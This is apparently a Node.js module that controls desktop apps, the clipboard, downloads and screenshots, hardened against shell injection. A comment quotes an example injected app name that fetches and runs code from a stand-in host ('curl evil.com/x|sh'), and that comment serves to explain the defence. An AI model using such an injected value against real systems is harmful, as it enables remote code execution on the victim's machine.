"use strict";
/**
 * desktopController.cjs — POST-Ω Sprint P5 UCC
 *
 * Desktop OS control adapter. Provides a uniform interface for:
 *   launchApp / focusWindow / switchWorkspace / openPath
 *   readDesktopState / clipboardRead / clipboardWrite / manageDownloads
 *
 * Reuses: visualCaptureService, continuousRuntimeObserver, runtimeActionEngine
 * Does NOT duplicate: Electron, Playwright, or any OS automation layer.
 * On macOS: uses `open` CLI and `osascript` for window/clipboard control.
 * On other platforms: uses no-op stubs so the service stays importable.
 */

const { execFileSync, spawn } = require("child_process");
const fs                   = require("path");
const path                 = require("path");
const os                   = require("os");

const ROOT   = path.join(__dirname, "../..");
const PLATFORM = process.platform; // darwin | linux | win32

const _try = fn => { try { return fn(); } catch { return null; } };
const _cap = () => _try(() => require("./visualCaptureService.cjs"));
const _obs = () => _try(() => require("./continuousRuntimeObserver.cjs"));
const _le  = () => _try(() => require("./continuousLearningEngine.cjs"));

function _ts() { return new Date().toISOString(); }

// Security Hardening (Zero-Trust Remediation): every function below used to
// build a shell command string via template interpolation of caller-supplied
// values (appName, filePath, clipboard text) and run it through execSync,
// which invokes /bin/sh -c on the full string — meaning any authenticated
// user could pass `appName: 'Foo"; curl evil.com/x|sh #'` and achieve RCE.
// _execFile below replaces every call site with execFileSync(bin, argvArray),
// which never invokes a shell — no `;`, `|`, `&&`, `$()`, or backticks are
// ever interpreted, regardless of what the argument strings contain.
function _execFile(bin, args, timeoutMs = 5000) {
  try {
    return { ok: true, out: execFileSync(bin, args, { timeout: timeoutMs, stdio: ["ignore", "pipe", "pipe"] }).toString().trim() };
  } catch (e) {
    return { ok: false, out: "", error: e.message?.slice(0, 300) };
  }
}

// App/window names are validated against a conservative allowlist pattern
// (letters, numbers, spaces, and a small set of punctuation real app names
// use) rather than passed to a shell — this is defense in depth on top of
// execFileSync already making shell metacharacters inert, so a name that
// fails this check is simply not a real application name.
const _SAFE_NAME = /^[\w\s.\-()&']{1,128}$/;
function _isSafeName(s) { return typeof s === "string" && _SAFE_NAME.test(s); }

// ── launchApp ─────────────────────────────────────────────────────────────────

function launchApp(appName, opts = {}) {
  if (!appName) return { ok: false, error: "appName required" };
  if (!_isSafeName(appName)) return { ok: false, app: appName, error: "invalid app name", ts: _ts() };

  let result;
  if (PLATFORM === "darwin") {
    result = _execFile("open", ["-a", appName], 8000);
  } else if (PLATFORM === "linux") {
    result = _execFile(appName, [], 3000);
  } else {
    result = { ok: false, out: "", error: `Platform ${PLATFORM} not supported for launchApp` };
  }

  _le()?.createLesson?.({ type: "desktop_action", title: `launchApp: ${appName}`, source: "desktopController", confidence: result.ok ? 0.9 : 0.4, tags: ["desktop", "launch", appName.toLowerCase().replace(/\s/g,"_")] });

  return { ok: result.ok, app: appName, error: result.error, ts: _ts() };
}

// ── focusWindow ───────────────────────────────────────────────────────────────

function focusWindow(appName) {
  if (!_isSafeName(appName)) return { ok: false, app: appName, error: "invalid app name" };
  if (PLATFORM === "darwin") {
    const script = `tell application "${appName}" to activate`;
    const r = _execFile("osascript", ["-e", script], 5000);
    return { ok: r.ok, app: appName, error: r.error };
  }
  return { ok: false, error: `focusWindow not supported on ${PLATFORM}` };
}

// ── openPath ──────────────────────────────────────────────────────────────────

function openPath(filePath) {
  const abs = path.resolve(filePath);
  let r;
  if (PLATFORM === "darwin") r = _execFile("open", [abs], 5000);
  else if (PLATFORM === "linux") r = _execFile("xdg-open", [abs], 5000);
  else r = { ok: false, error: `openPath not supported on ${PLATFORM}` };
  return { ok: r.ok, path: abs, error: r.error };
}

// ── clipboard ────────────────────────────────────────────────────────────────

function clipboardRead() {
  if (PLATFORM === "darwin") {
    const r = _execFile("pbpaste", [], 3000);
    return { ok: r.ok, content: r.out, error: r.error };
  }
  if (PLATFORM === "linux") {
    let r = _execFile("xclip", ["-selection", "clipboard", "-o"], 3000);
    if (!r.ok) r = _execFile("xsel", ["--clipboard", "--output"], 3000);
    return { ok: r.ok, content: r.out, error: r.error };
  }
  return { ok: false, content: "", error: `clipboardRead not supported on ${PLATFORM}` };
}

function clipboardWrite(text) {
  if (!text) return { ok: false, error: "text required" };
  if (PLATFORM === "darwin") {
    const r = _execFileStdin("pbcopy", [], text, 3000);
    return { ok: r.ok, error: r.error };
  }
  if (PLATFORM === "linux") {
    let r = _execFileStdin("xclip", ["-selection", "clipboard"], text, 3000);
    if (!r.ok) r = _execFileStdin("xsel", ["--clipboard", "--input"], text, 3000);
    return { ok: r.ok, error: r.error };
  }
  return { ok: false, error: `clipboardWrite not supported on ${PLATFORM}` };
}

// Writes `input` to the child's stdin instead of building a shell pipeline
// (`printf '%s' '<escaped>' | pbcopy`) — the previous quoting-escape approach
// is exactly the class of thing that's trivial to get wrong; passing the
// text as stdin to a non-shell execFileSync call has no injection surface
// regardless of what characters the text contains.
function _execFileStdin(bin, args, input, timeoutMs = 5000) {
  try {
    const { execFileSync } = require("child_process");
    const out = execFileSync(bin, args, { input, timeout: timeoutMs, stdio: ["pipe", "pipe", "pipe"] });
    return { ok: true, out: out.toString().trim() };
  } catch (e) {
    return { ok: false, out: "", error: e.message?.slice(0, 300) };
  }
}

// ── readDesktopState ──────────────────────────────────────────────────────────

function readDesktopState() {
  const state = {
    platform:     PLATFORM,
    hostname:     os.hostname(),
    uptime:       os.uptime(),
    memFreeBytes: os.freemem(),
    memTotalBytes:os.totalmem(),
    cpuCount:     os.cpus().length,
    loadAvg:      os.loadavg(),
    tempDir:      os.tmpdir(),
    homeDir:      os.homedir(),
    ts:           _ts(),
  };

  // macOS: active app + window title
  if (PLATFORM === "darwin") {
    const activeApp = _execFile("osascript", ["-e", 'tell application "System Events" to get name of first application process whose frontmost is true'], 3000);
    if (activeApp.ok) state.activeApp = activeApp.out;
    const windowTitle = _execFile("osascript", ["-e", 'tell application "System Events" to get title of front window of (first application process whose frontmost is true)'], 3000);
    if (windowTitle.ok) state.activeWindowTitle = windowTitle.out;
  }

  // Runtime health from observer
  const health = _obs()?.getHealth?.();
  if (health) state.runtimeHealth = health;

  return { ok: true, state };
}

// ── manageDownloads ───────────────────────────────────────────────────────────

function listDownloads() {
  const downloadsDir = path.join(os.homedir(), "Downloads");
  try {
    const files = require("fs").readdirSync(downloadsDir)
      .map(f => {
        const full = path.join(downloadsDir, f);
        const stat = require("fs").statSync(full);
        return { name: f, path: full, sizeBytes: stat.size, modifiedAt: stat.mtime.toISOString() };
      })
      .sort((a, b) => new Date(b.modifiedAt) - new Date(a.modifiedAt))
      .slice(0, 50);
    return { ok: true, downloads: files, dir: downloadsDir };
  } catch (e) {
    return { ok: false, downloads: [], error: e.message };
  }
}

// ── captureScreenshot (delegates to visualCaptureService) ────────────────────

async function captureScreenshot(opts = {}) {
  const cap = _cap();
  if (!cap) return { ok: false, error: "visualCaptureService not available" };
  try {
    // Trust boundary: captureDesktop() always returns a real object (never
    // undefined), so `||` never actually fell through on a real failure —
    // this previously did `return {ok:true, ...result}` unconditionally,
    // discarding a real {ok:false, error} from captureDesktop(). Also:
    // captureViewport() requires a `url` desktop captures never provide, so
    // it was never a working fallback in the first place — captureDesktop()
    // itself now has a real native-OS fallback (visualCaptureService.cjs)
    // for when Electron isn't the host process, so nothing else is needed.
    const result = await cap.captureDesktop?.(opts);
    if (!result) return { ok: false, error: "captureDesktop unavailable" };
    return { ...result };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

// ── switchWorkspace (macOS: Mission Control spaces) ───────────────────────────

function switchWorkspace(direction = "right") {
  if (PLATFORM === "darwin") {
    const keyCode = direction === "right" ? 124 : 123;
    const script = `tell application "System Events" to key code ${keyCode} using control down`;
    const r = _execFile("osascript", ["-e", script], 3000);
    return { ok: r.ok, direction, error: r.error };
  }
  return { ok: false, error: `switchWorkspace not supported on ${PLATFORM}` };
}

module.exports = {
  launchApp, focusWindow, openPath, switchWorkspace,
  clipboardRead, clipboardWrite,
  readDesktopState, listDownloads, captureScreenshot,
};
